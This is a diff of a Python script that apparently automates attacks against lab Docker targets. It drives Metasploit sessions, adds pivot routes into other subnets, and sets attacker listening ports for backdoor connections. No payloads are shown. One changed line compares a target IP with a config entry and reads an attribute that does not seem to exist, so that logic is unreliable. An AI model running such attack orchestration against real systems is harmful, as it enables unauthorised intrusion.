@@ -73,7 +73,7 @@ def main_procedure (attacker_ip, config_file, stealth=False, stealth_sleep=0):
             if(atk_sess!=None):
                 print(f"{C.COL_YELLOW}[*] other subnet found, adding new routes{C.COL_RESET}")
                 mc.route_add(met_sess["id_sess"], target_ip)
-                mc.route_print()
+                #mc.route_print()
                 router=met_sess
             
         
@@ -101,26 +101,23 @@ def main_procedure (attacker_ip, config_file, stealth=False, stealth_sleep=0):
         """
 
         for ra in randomized_attack:
+
+            LPORT = C.DEFAULT_LPORT  #PENTESTER LISTENING PORT
             attack_name=Attack_DB.attack_dict[ra].attack
-            # 0 se non ci serve connetterci alla backdoor, verrà sovrascritto dal valore presente dentro il file config se presente per quell'attacco
-            port=0
-            LPORT=0  #PENTESTER LISTENING PORT
-            #salviamo le informazioni necessarie per le porte delle backdoor (sulla macchina vittima e sulla macchina attaccante)
             for p in C.TARGETS_DOCKERS[target_ip]:
                 if(attack_name in p["attack_list"]):
-                    port=p["VM_Port"]
                     LPORT=p["exposed_port"]
                     break
-            if(LPORT==0):
-                LPORT=C.DEFAULT_LPORT
-
+        
             #format the string with the ip that need to be used
             attack_instr=Attack_DB.attack_dict[ra].instruction.format(target_ip,attacker_ip,LPORT=LPORT)
             attack_type=Attack_DB.attack_dict[ra].attack_type
             attack_wait=Attack_DB.attack_dict[ra].wait_time
             print(f"{C.COL_GREEN}[+] attacking ({target_ip}) with {attack_name}{C.COL_RESET}")
 
-            if(attack_name=="tomcat_server" and target_ip!=C.TOMCAT_VM):
+            if(attack_name=="tomcat_server" and target_ip!=C.TARGETS_DOCKERS[target_ip]):
+                print(C.TARGETS_DOCKERS[target_ip].docker_name)
+                print(C.TARGETS_DOCKERS[target_ip])
                 print(f"{C.COL_YELLOW}[*] Special attack tomcat_server cannot be done on this machine, skipping... {C.COL_RESET}")
                 continue
             if(attack_name=="smtp_server" and target_ip!=C.SMTP_VM):
@@ -132,8 +129,6 @@ def main_procedure (attacker_ip, config_file, stealth=False, stealth_sleep=0):
                 attack_obj=SshAttack(attack_name,attack_instr,attacker_ip,OOBSession,attack_wait, mc)
             else:
                 attack_obj=Metasploit_Attack(attack_name,attack_instr,attack_wait, mc)
-            
-
             if(type(attack_obj)==SshAttack and OOBSession==None):
                 print(f"{C.COL_RED}[-] can't use OOB attacks without an established session!{C.COL_RESET}")
                 continue
